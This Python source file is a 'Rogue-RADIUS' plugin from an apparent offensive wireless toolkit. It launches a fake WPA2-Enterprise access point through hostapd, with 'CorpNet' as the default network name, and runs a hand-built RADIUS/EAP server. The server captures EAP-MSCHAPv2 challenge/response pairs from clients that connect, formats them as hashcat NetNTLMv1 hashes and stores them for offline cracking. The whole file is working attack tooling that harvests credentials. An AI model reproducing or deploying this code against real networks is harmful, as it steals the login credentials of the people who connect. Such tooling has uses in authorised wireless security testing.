from core.plugin_manager import BasePlugin
import asyncio
import hashlib
import hmac as _hmac
import os
import socket
import struct
import subprocess
import threading
import time

# ── RADIUS wire constants ─────────────────────────────────────────────────────
_ACCESS_REQ       = 1
_ACCESS_REJECT    = 3
_ACCESS_CHALLENGE = 11

_ATTR_USER_NAME = 1
_ATTR_STATE     = 24
_ATTR_EAP_MSG   = 79
_ATTR_MSG_AUTH  = 80

# ── EAP codes / types ─────────────────────────────────────────────────────────
_EAP_REQUEST  = 1
_EAP_RESPONSE = 2
_EAP_FAILURE  = 4

_EAP_IDENTITY  = 1
_EAP_MSCHAPV2  = 26

# ── MSCHAPv2 opcodes ──────────────────────────────────────────────────────────
_MS_CHALLENGE = 1
_MS_RESPONSE  = 2

_HOSTAPD_ENT_TMPL = """\
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
auth_server_addr=127.0.0.1
auth_server_port={port}
auth_server_shared_secret={secret}
"""


class RogueRADIUSPlugin(BasePlugin):
    """
    WPA-Enterprise rogue RADIUS server.

    Spawns a WPA2-Enterprise AP via hostapd and runs a pure-Python RADIUS/EAP
    server that intercepts EAP-MSCHAPv2 challenge/response pairs from corporate
    Wi-Fi clients, then formats them as hashcat NetNTLMv1 (-m 5500) hashes for
    offline cracking via the Hash-Cracker plugin.

    Requires: hostapd
    """

    def __init__(self):
        self.running = False
        self.captured: list[dict] = []
        self._sock: socket.socket | None = None
        self._thread: threading.Thread | None = None
        self._hostapd_proc: subprocess.Popen | None = None
        self._secret = b"moonkeep_radius"
        self._sessions: dict[bytes, dict] = {}

    @property
    def name(self) -> str:
        return "Rogue-RADIUS"

    @property
    def description(self) -> str:
        return "WPA-Enterprise rogue RADIUS — captures MSCHAPv2 hashes for offline cracking"

    async def start(
        self,
        ssid: str = "CorpNet",
        channel: int = 6,
        iface: str = "wlan0",
        radius_port: int = 1812,
    ):
        if self.running:
            return
        self.running = True

        self._thread = threading.Thread(
            target=self._serve, args=(radius_port,), daemon=True
        )
        self._thread.start()

        await asyncio.to_thread(self._launch_hostapd, iface, ssid, channel, radius_port)
        self.log_event(f"Rogue RADIUS + WPA-Ent AP '{ssid}' live on {iface}", "START")

    async def stop(self):
        self.running = False
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
        if self._hostapd_proc:
            self._hostapd_proc.terminate()
        self.log_event("Rogue RADIUS stopped", "STOP")

    # ── hostapd ───────────────────────────────────────────────────────────────

    def _launch_hostapd(self, iface: str, ssid: str, channel: int, port: int):
        conf = _HOSTAPD_ENT_TMPL.format(
            iface=iface, ssid=ssid, channel=channel,
            port=port, secret=self._secret.decode(),
        )
        path = "/tmp/moonkeep_radius_hostapd.conf"
        with open(path, "w") as f:
            f.write(conf)
        self._hostapd_proc = subprocess.Popen(
            ["hostapd", path],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        time.sleep(2)

    # ── RADIUS UDP server ─────────────────────────────────────────────────────

    def _serve(self, port: int):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.settimeout(1.0)
        try:
            self._sock.bind(("0.0.0.0", port))
        except OSError as e:
            self.log_event(f"RADIUS bind failed on :{port} — {e}", "ERROR")
            self.running = False
            return

        while self.running:
            try:
                data, addr = self._sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                reply = self._handle(data)
                if reply:
                    self._sock.sendto(reply, addr)
            except Exception as e:
                self.log_event(f"RADIUS packet error: {e}", "ERROR")

    def _handle(self, data: bytes) -> bytes | None:
        if len(data) < 20:
            return None
        code, pid, length = struct.unpack("!BBH", data[:4])
        authenticator = data[4:20]
        attrs = _parse_attrs(data[20:length])

        if code != _ACCESS_REQ:
            return None

        eap_data = b"".join(attrs.get(_ATTR_EAP_MSG, []))
        state = attrs.get(_ATTR_STATE, [b""])[0]
        username = attrs.get(_ATTR_USER_NAME, [b""])[0].decode(errors="replace")

        if not eap_data or len(eap_data) < 5:
            return _reject(pid, authenticator, self._secret)

        eap_code = eap_data[0]
        eap_id   = eap_data[1]
        eap_type = eap_data[4]

        if eap_code != _EAP_RESPONSE:
            return None

        # ── Identity: respond with MSCHAPv2 challenge ─────────────────────────
        if eap_type == _EAP_IDENTITY:
            identity = eap_data[5:].decode(errors="replace").strip("\x00") or username
            challenge = os.urandom(16)
            tok = os.urandom(16)
            self._sessions[tok] = {"identity": identity, "challenge": challenge}
            ms_pkt = _build_ms_challenge(eap_id + 1, challenge)
            return _challenge_response(pid, authenticator, self._secret, ms_pkt, tok)

        # ── MSCHAPv2 Response: extract hash pair ──────────────────────────────
        if eap_type == _EAP_MSCHAPV2 and len(eap_data) > 9:
            sess = self._sessions.get(state, {})
            parsed = _parse_ms_response(eap_data[5:])
            if parsed and sess:
                identity = sess["identity"]
                challenge = sess["challenge"]
                peer_challenge = parsed["peer_challenge"]
                nt_response = parsed["nt_response"]
                # hashcat -m 5500  NetNTLMv1 format
                hashcat = (
                    f"{identity}::::{peer_challenge.hex().upper()}:"
                    f"{nt_response.hex().upper()}:{challenge.hex().upper()}"
                )
                record = {
                    "identity": identity,
                    "challenge": challenge.hex(),
                    "peer_challenge": peer_challenge.hex(),
                    "nt_response": nt_response.hex(),
                    "hashcat": hashcat,
                    "ts": time.time(),
                }
                self.captured.append(record)
                self.log_event(f"MSCHAPv2 hash captured: {identity}", "HARVEST")
                if self.target_store:
                    self.target_store.save_credential("Rogue-RADIUS:MSCHAPv2", hashcat)

        return _reject(pid, authenticator, self._secret)


# ── RADIUS wire helpers ───────────────────────────────────────────────────────

def _parse_attrs(raw: bytes) -> dict[int, list[bytes]]:
    out: dict[int, list[bytes]] = {}
    i = 0
    while i + 1 < len(raw):
        t, ln = raw[i], raw[i + 1]
        if ln < 2 or i + ln > len(raw):
            break
        out.setdefault(t, []).append(raw[i + 2 : i + ln])
        i += ln
    return out


def _attr(t: int, v: bytes) -> bytes:
    return struct.pack("!BB", t, 2 + len(v)) + v


def _msg_auth(code: int, pid: int, auth: bytes, body: bytes, secret: bytes) -> bytes:
    placeholder = _attr(_ATTR_MSG_AUTH, b"\x00" * 16)
    total = 20 + len(body) + len(placeholder)
    hdr = struct.pack("!BBH16s", code, pid, total, auth)
    mac = _hmac.new(secret, hdr + body + placeholder, hashlib.md5).digest()
    return _attr(_ATTR_MSG_AUTH, mac)


def _challenge_response(
    pid: int, req_auth: bytes, secret: bytes, eap: bytes, state: bytes
) -> bytes:
    body = _attr(_ATTR_EAP_MSG, eap) + _attr(_ATTR_STATE, state)
    ma = _msg_auth(_ACCESS_CHALLENGE, pid, req_auth, body, secret)
    body += ma
    total = 20 + len(body)
    hdr = struct.pack("!BBH16s", _ACCESS_CHALLENGE, pid, total, req_auth)
    resp_auth = hashlib.md5(hdr + body + secret).digest()
    return struct.pack("!BBH16s", _ACCESS_CHALLENGE, pid, total, resp_auth) + body


def _reject(pid: int, req_auth: bytes, secret: bytes) -> bytes:
    eap_fail = struct.pack("!BBHB", _EAP_FAILURE, pid, 5, 0)
    body = _attr(_ATTR_EAP_MSG, eap_fail)
    total = 20 + len(body)
    hdr = struct.pack("!BBH16s", _ACCESS_REJECT, pid, total, req_auth)
    resp_auth = hashlib.md5(hdr + body + secret).digest()
    return struct.pack("!BBH16s", _ACCESS_REJECT, pid, total, resp_auth) + body


def _build_ms_challenge(eap_id: int, challenge: bytes) -> bytes:
    server_name = b"moonkeep"
    # MSCHAPv2: opcode(1) + id(1) + ms_length(2) + value_size(1) + challenge(16) + name
    ms_len = 4 + 1 + len(challenge) + len(server_name)
    ms_body = struct.pack("!BBH", _MS_CHALLENGE, eap_id, ms_len)
    ms_body += bytes([len(challenge)]) + challenge + server_name
    eap_payload = bytes([_EAP_MSCHAPV2]) + ms_body
    return struct.pack("!BBH", _EAP_REQUEST, eap_id, 4 + len(eap_payload)) + eap_payload


def _parse_ms_response(data: bytes) -> dict | None:
    """
    MSCHAPv2 Response value layout:
      opcode(1) + id(1) + ms_len(2) + value_size(1) +
      peer_challenge(16) + reserved(8) + nt_response(24) + flags(1) + name
    """
    if len(data) < 54 or data[0] != _MS_RESPONSE:
        return None
    peer_challenge = data[5:21]
    nt_response = data[29:53]
    return {"peer_challenge": peer_challenge, "nt_response": nt_response}
